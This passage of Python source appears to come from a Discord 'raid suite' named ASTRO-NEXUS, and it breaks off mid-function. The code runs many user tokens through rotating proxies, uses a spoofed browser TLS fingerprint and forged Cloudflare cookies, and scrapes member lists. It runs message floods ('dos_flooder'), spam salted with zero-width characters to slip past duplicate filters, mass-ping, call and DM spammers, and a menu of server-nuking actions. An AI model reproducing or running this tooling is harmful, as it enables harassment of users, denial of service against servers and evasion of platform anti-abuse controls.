session = tls_client.Session(client_identifier="chrome_138", random_tls_extension_order=True, ja3_string="771,4865-4866-4867-49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53,0-5-10-11-13-16-18-23-27-35-43-45-51-17613-65037-65281,4588-29-23-24,0", h2_settings={"HEADER_TABLE_SIZE": 65536, "ENABLE_PUSH": 0, "INITIAL_WINDOW_SIZE": 6291456, "MAX_HEADER_LIST_SIZE": 262144}, h2_settings_order=["HEADER_TABLE_SIZE", "ENABLE_PUSH", "INITIAL_WINDOW_SIZE", "MAX_HEADER_LIST_SIZE"], supported_signature_algorithms=["ecdsa_secp256r1_sha256", "rsa_pss_rsae_sha256", "rsa_pkcs1_sha256", "ecdsa_secp384r1_sha384", "rsa_pss_rsae_sha384", "rsa_pkcs1_sha384", "rsa_pss_rsae_sha512", "rsa_pkcs1_sha512"], supported_versions=["TLS_1_3", "TLS_1_2"], key_share_curves=["GREASE", "X25519MLKEM768", "X25519", "secp256r1", "secp384r1"], pseudo_header_order=[":method", ":authority", ":scheme", ":path"], connection_flow=15663105, priority_frames=[])

def get_random_str(length):
    return "".join(random.choice(string.ascii_letters + string.digits) for _ in range(length))

def wrapper(func):
    def wrapper(*args, **kwargs):
        console.clear()
        console.render_ascii()
        result = func(*args, **kwargs)
        return result
    return wrapper

C = {
    "green": h("#65fb07"),
    "red": h("#Fb0707"),
    "yellow": h("#FFCD00"),
    "magenta": h("#b207f5"),
    "blue": h("#00aaff"),
    "cyan": h("#aaffff"),
    "gray": h("#8a837e"),
    "white": h("#DCDCDC"),
    "pink": h("#c203fc"),
    "light_blue": h("#07f0ec"),
    "brown": h("#8B4513"),
    "black": h("#000000"),
    "aqua": h("#00CED1"),
    "purple": h("#800080"),
    "lime": h("#00FF00"),
    "orange": h("#FFA500"),
    "indigo": h("#4B0082"),
    "violet": h("#EE82EE"),
    "gold": h("#FFD700"),
    "silver": h("#C0C0C0"),
    "teal": h("#008080"),
    "navy": h("#000080"),
    "olive": h("#808000"),
    "maroon": h("#800000"),
    "coral": h("#FF7F50"),
    "salmon": h("#FA8072"),
    "khaki": h("#F0E68C"),
    "orchid": h("#DA70D6"),
    "rose": h("#FF007F")
}

class Files:
    @staticmethod
    def write_config():
        try:
            if not os.path.exists("config.json"):
                data = {
                    "Proxies": False,
                    "Theme": "light_blue", 
                }
                with open("config.json", "w") as f:
                    json.dump(data, f, indent=4)
        except Exception as e:
            console.log("Failed", C["red"], "Failed to Write Config", e)

    @staticmethod
    def write_folders():
        folders = ["data", "scraped"]
        for folder in folders:
            try:
                if not os.path.exists(folder):
                    os.mkdir(folder)
            except Exception as e:
                console.log("Failed", C["red"], "Failed to Write Folders", e)

    @staticmethod
    def write_files():
        files = ["tokens.txt", "proxies.txt"]
        for file in files:
            try:
                path = f"data/{file}"
                if not os.path.exists(path):
                    with open(path, "a") as f:
                        f.close()
            except Exception as e:
                console.log("Failed", C["red"], "Failed to Write Files", e)

    @staticmethod
    def run_tasks():
        tasks = [Files.write_config, Files.write_folders, Files.write_files]
        for task in tasks:
            task()

Files.run_tasks()

with open("config.json") as f:
    Config = json.load(f)
    
proxy = Config["Proxies"]
color = Config["Theme"]

class Render:
    def __init__(self):
        try:
            self.size = os.get_terminal_size().columns
        except (OSError, ValueError):
            self.size = 120  # Default fallback
        self.print_lock = threading.Lock()
        self.background = C[color] if color in C else C["light_blue"]
        threading.Thread(target=self._animate_title, daemon=True).start()

    def _animate_title(self):
        if sys.platform != "win32": return
        import ctypes
        text = "   ASTRO-NEXUS OVERDRIVE - PROFESSIONAL ELITE DISCORD RAID SUITE 2026 - STATUS: ACTIVE   "
        while True:
            for i in range(len(text)):
                display = text[i:] + text[:i]
                ctypes.windll.kernel32.SetConsoleTitleW(f"🌑 {display} 🌑")
                time.sleep(0.12)

    def title(self, title):
        if sys.platform == "win32":
            import ctypes
            ctypes.windll.kernel32.SetConsoleTitleW(title)

    def clear(self):
        os.system("cls" if os.name == "nt" else "clear")
        
    def render_ascii(self):
        self.clear()
        self.title(f"ASTRO-NEXUS | Connected as {os.getlogin()} | Professional Edition")
        
        ascii_art = [
            " █████╗ ███████╗████████╗██████╗  ██████╗     ███╗   ██╗███████╗██╗  ██╗██╗   ██╗███████╗",
            "██╔══██╗██╔════╝╚══██╔══╝██╔══██╗██╔═══██╗    ████╗  ██║██╔════╝╚██╗██╔╝██║   ██║██╔════╝",
            "███████║███████╗   ██║   ██████╔╝██║   ██║    ██╔██╗ ██║█████╗   ╚███╔╝ ██║   ██║███████╗",
            "██╔══██║╚════██║   ██║   ██╔══██╗██║   ██║    ██║╚██╗██║██╔══╝   ██╔██╗ ██║   ██║╚════██║",
            "██║  ██║███████║   ██║   ██║  ██║╚██████╔╝    ██║ ╚████║███████╗██╔╝ ██╗╚██████╔╝███████║",
            "╚═╝  ╚═╝╚══════╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝     ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝"
        ]

        # Dynamic Rainbow effect using HSL to RGB conversion or simple color cycling
        rainbow_colors = [C["red"], C["orange"], C["yellow"], C["green"], C["blue"], C["magenta"]]
        
        for i, line in enumerate(ascii_art):
            color = rainbow_colors[i % len(rainbow_colors)]
            try:
                cols = os.get_terminal_size().columns
            except:
                cols = 120
            print(f"{color}{line.center(cols)}{Fore.RESET}")
        print("".center(cols))

    def raider_options(self):
        with open("data/proxies.txt") as f:
            global proxies
            proxies = f.read().splitlines()
        with open("data/tokens.txt", "r") as f:
            global tokens
            tokens = [line.strip().replace('"', '').replace("'", "") for line in f.read().splitlines() if line.strip()]

        edges = ["─", "╭", "│", "╰", "╯", "╮", "»", "«"]
        # Hyper-Rainbow Title
        title_text = f"Loaded ‹ {len(tokens)} › tokens | Loaded ‹ {len(proxies)} › proxies"
        padding = (self.size - len(title_text)) // 2
        print(f"{Fore.RESET}{' ' * padding}{C['rose']}{title_text}{Fore.RESET}\n")

        menu = [
            " «01» Joiner        «08» Button Click   «15» Change Nick    «22» Onboarding",
            " «02» Leaver        «09» Accept Rules   «16» Thread Spam    «23» Dm Spammer",
            " «03» Spammer       «10» Guild Check    «17» Typer          «25» Mass Report",
            " «04» Token Checker «11» Friend Spam    «18» Nitro Sniper   «26» HypeSquad",
            " «05» Reaction      «12» Analytics      «19» Call Spammer   «27» Mass Block",
            " «06» Server Nuker  «13» Onliner        «20» Bio Change     «28» Leave All",
            " «07» Formatter     «14» Soundbord      «21» Voice Joiner   «29» Token Scraper",
            " «24» Exit",
            "─────────────────────────────────────────────────────────────────────────────",
            " «30» KABOOM (Nuke) «31» DEL CHANNELS   «32» DEL ROLES      «33» DEL EMOJIS",
            " «34» DEL WEBHOOKS  «35» NEW CHANNELS   «36» NEW ROLES      «37» MASS BAN",
            " «38» MASS KICK     «39» IDENTITY MOD   «40» PRUNE GUILD    «41» AUTO STATUS",
            " «42» GRANT ADMIN   «43» AUDIT FLOOD    «44» WEBHOOK BLAST  «45» PROXY GEN",
            " «46» PROXY CLEAN"
        ]
        

        print(f"{self.background}╭───────────────────────────────────────────────────────────────────────────────╮{Fore.RESET}")
        colors = [C["red"], C["orange"], C["yellow"], C["green"], C["blue"], C["magenta"], C["orchid"]]
        start_idx = int(time.time() * 2) % len(colors)
        for i, line in enumerate(menu):
            color = colors[(i + start_idx) % len(colors)]
            if "──" in line:
                # Synchronize divider length with the 79-width interior
                divider = "─" * 79
                print(f"{self.background}├{divider}┤{Fore.RESET}")
            else:
                # Content padding: 1 space + 77 chars + 1 space = 79 chars inside
                content = line[:77].ljust(77)
                print(f"{self.background}│{Fore.RESET} {color}{content}{Fore.RESET} {self.background}│{Fore.RESET}")
        print(f"{self.background}╰───────────────────────────────────────────────────────────────────────────────╯{Fore.RESET}")
        print(f"{'«~» Credits   «?» Tokens   «!» Proxies   «h» Guide'.center(self.size)}")
    def run(self):
        self.render_ascii()
        self.raider_options()


    def log(self, text=None, color=None, token=None, log=None):
        response = f"{Fore.RESET}[{datetime.now().strftime(f'{Fore.LIGHTBLACK_EX}%H:%M:%S{Fore.RESET}')}] "
        if text:
            response += f"[{color}{text}{C['white']}] "
        if token:
            response += token
        if log:
            response += f" ({C['gray']}{log}{C['white']})"

        with self.print_lock:
            print(response)

    def prompt(self, text, ask=None):
        prompted = f"[{C[color]}{text}{C['white']}]"
        if ask:
            prompted += f" {C['gray']}(y/n){C['white']}: "
        else:
            prompted += ": "
            
        return prompted

console = Render()

# Big Thanks to Aniell4 for the scraper
class Utils:
    @staticmethod
    def range_corrector(ranges):
        if [0, 99] not in ranges:
            ranges.insert(0, [0, 99])
        return ranges

    @staticmethod
    def get_ranges(index, multiplier, member_count):
        initial_num = index * multiplier
        ranges = [[initial_num, initial_num + 99]]
        if member_count > initial_num + 99:
            ranges.append([initial_num + 100, initial_num + 199])
        return Utils.range_corrector(ranges)

    @staticmethod
    def parse_member_list_update(response):
        data = response["d"]
        member_data = {
            "online_count": data["online_count"],
            "member_count": data["member_count"],
            "id": data["id"],
            "guild_id": data["guild_id"],
            "hoisted_roles": data["groups"],
            "types": [op["op"] for op in data["ops"]],
            "locations": [],
            "updates": [],
        }

        for chunk in data["ops"]:
            op_type = chunk["op"]
            if op_type in {"SYNC", "INVALIDATE"}:
                member_data["locations"].append(chunk["range"])
                member_data["updates"].append(chunk["items"] if op_type == "SYNC" else [])
            elif op_type in {"INSERT", "UPDATE", "DELETE"}:
                member_data["locations"].append(chunk["index"])
                member_data["updates"].append(chunk["item"] if op_type != "DELETE" else [])

        return member_data

class DiscordSocket(websocket.WebSocketApp):
    def __init__(self, token, guild_id, channel_id):
        self.token = token
        self.guild_id = guild_id
        self.channel_id = channel_id
        self.blacklisted_ids = {"1100342265303547924", "1190052987477958806", "833007032000446505", "1273658880039190581", "1308012310396407828", "1326906424873193586", "1334512667456442411", "1349869929809186846"}

        headers = {
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "en-US,en;q=0.9",
            "Cache-Control": "no-cache",
            "Pragma": "no-cache",
            "Sec-WebSocket-Extensions": "permessage-deflate; client_max_window_bits",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
        }

        super().__init__(
            "wss://gateway.discord.gg/?encoding=json&v=9",
            header=headers,
            on_open=self.on_open,
            on_message=self.on_message,
            on_close=self.on_close,
        )

        self.end_scraping = False
        self.guilds = {}
        self.members = {}
        self.ranges = [[0, 0]]
        self.last_range = 0
        self.packets_recv = 0

    def run(self):
        self.run_forever()
        return self.members

    def scrape_users(self):
        if not self.end_scraping:
            self.send(json.dumps({
                "op": 14,
                "d": {
                    "guild_id": self.guild_id,
                    "typing": True,
                    "activities": True,
                    "threads": True,
                    "channels": {self.channel_id: self.ranges}
                }
            }))

    def on_open(self, ws):
        self.send(json.dumps({
            "op": 2,
            "d": {
                "token": self.token,
                "capabilities": 125,
                "properties": {
                    "os": "Windows",
                    "browser": "Chrome",
                    "device": "",
                    "system_locale": "it-IT",
                    "browser_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
                    "browser_version": "138.0.0.0",
                    "os_version": "10",
                    "referrer": "",
                    "referring_domain": "",
                    "referrer_current": "",
                    "referring_domain_current": "",
                    "release_channel": "stable",
                    "client_build_number": 419434,
                    "client_event_source": None
                },
                "presence": {
                    "status": "online",
                    "since": 0,
                    "activities": [],
                    "afk": False
                },
                "compress": False,
                "client_state": {
                    "guild_hashes": {},
                    "highest_last_message_id": "0",
                    "read_state_version": 0,
                    "user_guild_settings_version": -1,
                    "user_settings_version": -1
                }
            }
        }))

    def heartbeat_thread(self, interval):
        while not self.end_scraping:
            self.send(json.dumps({"op": 1, "d": self.packets_recv}))
            time.sleep(interval)

    def on_message(self, ws, message):
        decoded = json.loads(message)
        if not decoded:
            return

        self.packets_recv += decoded["op"] != 11

        if decoded["op"] == 10:
            threading.Thread(
                target=self.heartbeat_thread,
                args=(decoded["d"]["heartbeat_interval"] / 1000,),
                daemon=True,
            ).start()

        if decoded["t"] == "READY":
            self.guilds.update({
                guild["id"]: {"member_count": guild["member_count"]}
                for guild in decoded["d"]["guilds"]
            })

            total_members = self.guilds[self.guild_id]["member_count"]

            console.log("Info", C["yellow"], False, f"Guild has {total_members} members → ETA ~{round(total_members / 150, 1)}s")

        if decoded["t"] == "READY_SUPPLEMENTAL":
            self.ranges = Utils.get_ranges(0, 100, self.guilds[self.guild_id]["member_count"])
            self.scrape_users()

        elif decoded["t"] == "GUILD_MEMBER_LIST_UPDATE":
            parsed = Utils.parse_member_list_update(decoded)
            if parsed["guild_id"] == self.guild_id:
                self.process_updates(parsed)

    def process_updates(self, parsed):
        if "SYNC" in parsed["types"] or "UPDATE" in parsed["types"]:
            for i, update_type in enumerate(parsed["types"]):
                if update_type in {"SYNC", "UPDATE"}:
                    if not parsed["updates"][i]:
                        self.end_scraping = True
                        break
                    self.process_members(parsed["updates"][i])

                self.last_range += 1
                self.ranges = Utils.get_ranges(self.last_range, 100, self.guilds[self.guild_id]["member_count"])
                self.scrape_users()

        if self.end_scraping:
            self.close()

    def process_members(self, updates):
        for item in updates:
            member = item.get("member")
            if member:
                user = member.get("user", {})
                user_id = user.get("id")
                if user_id and user_id not in self.blacklisted_ids and not user.get("bot"):
                    self.members[user_id] = {
                        "tag": f"{user.get('username')}#{user.get('discriminator')}",
                        "id": user_id,
                    }

    def on_close(self, ws, close_code, close_msg):
        console.log("Success", C["green"], False, f"Scraped {len(self.members)} members")

def scrape(token, guild_id, channel_id):
    sb = DiscordSocket(token, guild_id, channel_id)
    return sb.run()
    
class Raider:
    def __init__(self):
        self.build_number = 429117
        self.cf_token = self.get_cloudflare_cookies()
        self.cookies, self.fingerprint = self.get_discord_cookies()
        self.ws = websocket.WebSocket()

    def get_cloudflare_cookies(self):
        try:
            response = requests.get(
                "https://discord.com/channels/@me"
            )

            challange = re.sub(r".*r:'([^']+)'.*", r"\1", response.text, flags=re.DOTALL)
            build_number = re.sub(r'.*"BUILD_NUMBER":"(\d+)".*', r'\1', response.text, flags=re.DOTALL)
            if build_number is not None:
                self.build_number = build_number

            cf_token = requests.post(f'https://discord.com/cdn-cgi/challenge-platform/h/b/jsd/r/{random.random():.16f}:{str(int(time.time()))}:{secrets.token_urlsafe(32)}/{challange}')
            if cf_token.status_code == 200:
                cookie = list(cf_token.cookies)[0]
                return f"{cookie.name}={cookie.value}"
            else:
                return None
        except:
            return None

    def get_discord_cookies(self):
        try:
            response = requests.get(
                'https://discord.com/api/v9/experiments',
            )
            if response.status_code == 200:
                return "; ".join(
                    [f"{cookie.name}={cookie.value}" for cookie in response.cookies]
                ) + f"; {self.cf_token}; locale=en-US", response.json()["fingerprint"]
            else:
                console.log("ERROR", C["red"], "Failed to get cookies using Static")
                return "__dcfduid=62f9e16000a211ef8089eda5bffbf7f9; __sdcfduid=62f9e16100a211ef8089eda5bffbf7f98e904ba04346eacdf57ee4af97bdd94e4c16f7df1db5132bea9132dd26b21a2a; __cfruid=a2ccd7637937e6a41e6888bdb6e8225cd0a6f8e0-1714045775; _cfuvid=s_CLUzmUvmiXyXPSv91CzlxP00pxRJpqEhuUgJql85Y-1714045775095-0.0.1.1-604800000; locale=en-US"
        except Exception as e:
            console.log("ERROR", C["red"], "get_discord_cookies", e)

    def super_properties(self):
        try:
            payload = {
                "os": "Windows",
                "browser": "Chrome",
                "release_channel": "stable",
                "os_version": "10",
                "system_locale": "pl",
                "browser_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36 Edg/139.0.0.0",
                "browser_version": "139.0.0.0",
                "client_build_number": int(self.build_number),
                "client_launch_id": str(uuid.uuid4()),
                "client_heartbeat_session_id": str(uuid.uuid4()),
                "launch_signature": str(uuid.uuid4()),
                "client_event_source": None,
            }
            properties = base64.b64encode(json.dumps(payload).encode()).decode()
            return properties
        except Exception as e:
            console.log("ERROR", C["red"], "get_super_properties", e)

    def headers(self, token):
        return {
            "authority": "discord.com",
            "accept": "*/*",
            "accept-language": "en",
            "authorization": token,
            "cookie": self.cookies,
            "content-type": "application/json",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36 Edg/139.0.0.0",
            "x-discord-locale": "en-US",
            "x-debug-options": "bugReporterEnabled",
            "x-fingerprint": self.fingerprint,
            "x-super-properties": self.super_properties(),
        }
    
    def nonce(self):
        return int(time.time() * 1000) - 1420070400000 << 22

    def request(self, method, url, token, **kwargs):
        """Elite Networking Wrapper with 429 Handling & Proxy Roation"""
        while not STRIKE_EVENT.is_set():
            proxy = {"http": f"http://{random.choice(proxies)}", "https": f"http://{random.choice(proxies)}"} if proxies else None
            try:
                # Merge custom headers with standard ones
                headers = self.headers(token)
                if "headers" in kwargs:
                    headers.update(kwargs.pop("headers"))
                
                res = session.request(method, url, headers=headers, proxies=proxy, **kwargs)
                
                if res.status_code == 429:
                    retry_after = res.json().get("retry_after", 1)
                    # console.log("RATE LIMIT", C["yellow"], f"{token[:20]}...", f"Waiting {retry_after}s")
                    time.sleep(retry_after)
                    continue
                return res
            except Exception as e:
                # console.log("REQ ERROR", C["red"], f"{token[:20]}...", str(e)[:50])
                return None

    def joiner(self, invite):
        try:
            # Coordinated Invite Fetching (Only one token needs to succeed)
            invite_info = None
            for token in tokens:
                res = self.request("GET", f"https://discord.com/api/v9/invites/{invite}?with_counts=true&with_expiration=true", token)
                if res and res.status_code == 200:
                    invite_info = res.json()
                    break
            
            if not invite_info:
                console.log("Failed", C["red"], "Invalid invite or all tokens rate-limited")
                return

            guild_name = invite_info["guild"]["name"]
            guild_id = invite_info["guild"]["id"]
            
            context = base64.b64encode(json.dumps({
                "location": "Join Guild",
                "location_guild_id": guild_id,
                "location_channel_id": invite_info["channel"]["id"],
                "location_channel_type": invite_info["channel"]["type"]
            }).encode()).decode()

            def task(token):
                headers = {"X-Context-Properties": context}
                payload = {"session_id": uuid.uuid4().hex}
                res = self.request("POST", f"https://discord.com/api/v9/invites/{invite}", token, headers=headers, json=payload)
                
                if res and res.status_code == 200:
                    console.log("Joined", C["green"], f"{token[:25]}...", guild_name)
                elif res and res.status_code == 400:
                    console.log("Captcha", C["yellow"], f"{token[:25]}...", "Requires Captcha")
                else:
                    msg = res.json().get("message", "Error") if res else "No Response"
                    console.log("Failed", C["red"], f"{token[:25]}...", msg)

            args = [(token,) for token in tokens]
            Menu().run(task, args)
        except Exception as e:
            console.log("Error", C["red"], "Joiner Failure", e)

    def leaver(self, token, guild):
        try:
            res = self.request("DELETE", f"https://discord.com/api/v9/users/@me/guilds/{guild}", token, json={"lurking": False})
            if res and res.status_code == 204:
                console.log("Left", C["green"], f"{token[:25]}...", f"Server ID: {guild}")
            else:
                msg = res.json().get("message", "Error") if res else "No Response"
                console.log("Failed", C["red"], f"{token[:25]}...", msg)
        except Exception as e:
            console.log("Error", C["red"], f"{token[:25]}...", e)

    def get_token_info(self, token):
        """Fetch username and status of a token with stable fallback"""
        # Cleanup token just in case
        token = token.strip().replace('"', '').replace("'", "")
        
        headers = {
            "Authorization": token,
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        }
        
        try:
            # First try: Direct Request (No Proxy) - Most reliable for info check
            res = requests.get("https://discord.com/api/v9/users/@me", headers=headers, timeout=10)
            if res.status_code == 200:
                data = res.json()
                return f"{data['username']}#{data.get('discriminator', '0000')}"
            else:
                # Log the exact status for debugging
                log_status = f"HTTP {res.status_code}"
                if res.status_code == 401: log_status = "Invalid/Expired"
                elif res.status_code == 403: log_status = "Locked/Verification"
                return f"Faulty: {log_status}"

            return f"Unknown ({res.status_code if res else 'Fail'})"
        except Exception as e:
            return f"Conn Error ({str(e)[:10]})"

    def dos_flooder(self, token, channel, message, threads=5):
        """Intense API Flooding Mode (DOS)"""
        while not STRIKE_EVENT.is_set():
            try:
                payload = {
                    "content": message + " " + uuid.uuid4().hex[:5], 
                    "nonce": str(self.nonce()), 
                    "tts": False
                }
                res = self.request("POST", f"https://discord.com/api/v9/channels/{channel}/messages", token, json=payload)
                # Zero delay for DOS mode unless rate-limited
                if res and res.status_code == 429:
                    time.sleep(res.json().get('retry_after', 0.5))
            except:
                time.sleep(0.1)

    def spammer(self, token, channel, message=None, guild=None, massping=None, pings=None, random_str=None, delay=None):
        """Lethal Ghost Spammer v1: Ultimate Bypass"""
        ghost_chars = ["\u200b", "\u200c", "\u200d", "\u200e", "\u200f"]
        while not STRIKE_EVENT.is_set():
            try:
                # Ghost Bypass Injection
                content = f"{message}"
                if massping:
                    content += f" {self.get_random_members(guild, int(pings))}"
                
                # Dynamic Salt to bypass 'Same message' filters
                salt = "".join(random.choices(ghost_chars, k=5)) + uuid.uuid4().hex[:6]
                content = f"{content} {salt}"
                
                # Payload with unique Nonce
                payload = {
                    "content": content, 
                    "nonce": str((int(time.time() * 1000) - 1420070400000) * 4194304), 
                    "tts": False,
                    "flags": 0
                }
                
                res = self.request("POST", f"https://discord.com/api/v9/channels/{channel}/messages", token, json=payload)
                
                if res and res.status_code == 200:
                    console.log("Sent", C["green"], f"{token[:25]}...", "Ghost Msg Deployed")
                elif res and res.status_code == 429:
                    retry_after = res.json().get('retry_after', 1)
                    console.log("Limit", C["yellow"], f"{token[:25]}...", f"Rate-Limited ({retry_after}s)")
                    time.sleep(retry_after)
                elif res and res.status_code == 403:
                    console.log("Lock", C["rose"], f"{token[:25]}...", "No Access/Blocked")
                    break
                
                if delay: time.sleep(delay)
                else: time.sleep(0.1) # Hyper-Aggressive baseline
                
            except Exception as e:
                console.log("Error", C["red"], f"{token[:25]}...", str(e)[:30])
                time.sleep(1)

    def member_scrape(self, guild_id, channel_id):
        try:
            in_guild = []

            if not os.path.exists(f"scraped/{guild_id}.json"):
                for token in tokens:
                    response = session.get(
                        f"https://discord.com/api/v9/guilds/{guild_id}",
                        headers=self.headers(token),
                    )

                    if response.status_code == 200:
                        in_guild.append(token)
                        break

                if not in_guild:
                    console.log("Failed", C["red"], "Missing Access")
                token = random.choice(in_guild)
                members = scrape(token, guild_id, channel_id)

                with open(f"scraped/{guild_id}.json", "w") as f:
                    json.dump(list(members.keys()), f, indent=2)
        except Exception as e:
            console.log("Failed", C["red"], False, e)

    def get_random_members(self, guild_id, count):
        try:
            with open(f"scraped/{guild_id}.json") as f:
                members = json.load(f)

            message = ""
            for _ in range(int(count)):
                message += f"<@!{random.choice(members)}>"
            return message
        except Exception as e:
            console.log("Failed", C["red"], "Failed to get Random Members", e)

    def voice_spammer(self, token, ws, guild_id, channel_id, close=None):
        try:
            self.onliner(token, ws)
            ws.send(
                json.dumps(
                    {
                        "op": 4,
                        "d": {
                            "guild_id": guild_id,
                            "channel_id": channel_id,
                            "self_mute": False,
                            "self_deaf": False,
                            "self_stream": False,
                            "self_video": True,
                        },
                    }
                )
            )

            ws.send(
                json.dumps(
                    {
                        "op": 18,
                        "d": {
                            "type": "guild",
                            "guild_id": guild_id,
                            "channel_id": channel_id,
                            "preferred_region": "singapore",
                        },
                    }
                )
            )
            
            ws.send(json.dumps({"op": 1, "d": None}))
            if close:
                ws.close()
        except Exception as e:
            console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)

    def vc_joiner(self, token, guild, channel, ws):
        try:
            for _ in range(1):
                ws.connect("wss://gateway.discord.gg/?v=9&encoding=json")
                ws.send(json.dumps({
                    "op": 2,
                    "d": {
                        "token": token,
                        "properties": {
                            "os": "windows",
                            "browser": "Discord",
                            "device": "desktop"
                        }
                    }
                }))

                ws.send(json.dumps({
                    "op": 4,
                    "d": {
                        "guild_id": guild,
                        "channel_id": channel,
                        "self_mute": random.choice([True, False]),
                        "self_deaf": False
                    }
                }))
        except Exception as e:
            console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)

    def onliner(self, token, ws):
        try:
            ws.connect("wss://gateway.discord.gg/?v=9&encoding=json")
            ws.send(
                json.dumps(
                    {
                        "op": 2,
                        "d": {
                            "token": token,
                            "properties": {
                                "os": "Windows",
                            },
                            "presence": {
                                "game": {
                                    "name": "ASTRO-NEXUS",
                                    "type": 0,
                                },
                                "status": random.choice(['online', 'dnd', 'idle']),
                                "since": 0,
                                "afk": False
                            }
                        },
                    }
                )
            )

            console.log("Onlined", C[color], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**")
        except Exception as e:
            console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)

    def join_voice_channel(self, token, guild_id, channel_id):
        ws = websocket.WebSocket()

        def check_for_guild(token):
            response = session.get(
                f"https://discord.com/api/v9/guilds/{guild_id}", 
                headers=self.headers(token)
            )
            if response.status_code == 200:
                return True
            else:
                return False

        def check_for_channel(token):
            if check_for_guild(token):
                response = session.get(
                    f"https://discord.com/api/v9/channels/{channel_id}", 
                    headers=self.headers(token)
                )

                if response.status_code == 200:
                    return True
                else:
                    return False

        if check_for_channel(token):
            console.log("Joined", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**")
            self.vc_joiner(token, guild_id, channel_id, ws)
        else:
            console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**")

    def soundbord(self, token, channel):
        try:
            sounds = session.get(
                "https://discord.com/api/v9/soundboard-default-sounds",
                headers=self.headers(token)
            ).json()

            time.sleep(1)

            while not STRIKE_EVENT.is_set():
                sound = random.choice(sounds)

                payload = {
                    "emoji_id": None,
                    "emoji_name": sound["emoji_name"],
                    "sound_id": sound["sound_id"],
                }

                response = session.post(
                    f"https://discord.com/api/v9/channels/{channel}/send-soundboard-sound", 
                    headers=self.headers(token), 
                    json=payload,
                )

                if response.status_code == 204:
                    console.log("Success", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", f"Played {sound['name']}")
                elif response.status_code == 429:
                    retry_after = response.json()["retry_after"] + random.uniform(0.1, 0.5)
                    console.log("Ratelimit", C["yellow"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", f"Ratelimit Exceeded - {retry_after:.2f}s",)
                    time.sleep(float(retry_after))
                else:
                    break
                time.sleep(random.uniform(0.56, 0.75))
        except Exception as e:
            console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)

    def open_dm(self, token, user_id):
        try:
            payload = {
                "recipients": [f'{user_id}'],
            }

            response = session.post(
                "https://discord.com/api/v9/users/@me/channels",
                headers=self.headers(token),
                json=payload
            )

            if response.status_code == 200:
                return response.json()["id"]
            else:
                console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", response.json().get("message"))
                return
        except Exception as e:
            console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)

    def call_spammer(self, token, user_id):
        try:
            while not STRIKE_EVENT.is_set():
                channel_id = self.open_dm(token, user_id)

                json_data = {
                    'recipients': None,
                }

                response = session.post(
                    f"https://discord.com/api/v9/channels/{channel_id}/call",
                    headers=self.headers(token),
                    json=json_data,
                )

                if response.status_code == 200:
                    console.log("Called", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", user_id)
                    ws = websocket.WebSocket()
                    self.voice_spammer(token, ws, channel_id, channel_id, True)
                else:
                    console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", response.json().get("message"))
                    return
                time.sleep(5)
        except Exception as e:
            console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)

    def dm_spammer(self, token, user_id, message):
        try:
            channel_id = self.open_dm(token, user_id)

            while not STRIKE_EVENT.is_set():
                payload = {
                    "content": message,
                    "nonce": self.nonce(),
                }

                response = session.post(
                    f"https://discord.com/api/v9/channels/{channel_id}/messages",
                    headers=self.headers(token),
                    json=payload
                )

                if response.status_code == 200:
                    console.log("Send", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", user_id)
                else:
                    console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", response.json().get("message"))  
                    break
                time.sleep(7)
        except Exception as e:
            console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)

    def format_tokens(self):
        try:
            formatted = []

            for token in tokens:
                token = token.strip()

                if token:
                    tokens_split = token.split(":")
                    if len(tokens_split) >= 3:
                        formatted_token = tokens_split[2]
                        formatted.append(formatted_token)
                    else:
                        formatted.append(token)

            console.log("Success", C["green"], f"Formatted {len(formatted)} tokens")

            with open("data/tokens.txt", "w") as f:
                for token in formatted:
                    f.write(f"{token}\n")

            Menu().main_menu()
        except Exception as e:
            console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)

    def bio_changer(self, token, bio):
        try:
            payload = {
                "bio": bio
            }

            response = session.patch(
                "https://discord.com/api/v9/users/@me/profile",
                headers=self.headers(token),
                json=payload
            )

            if response.status_code == 200:
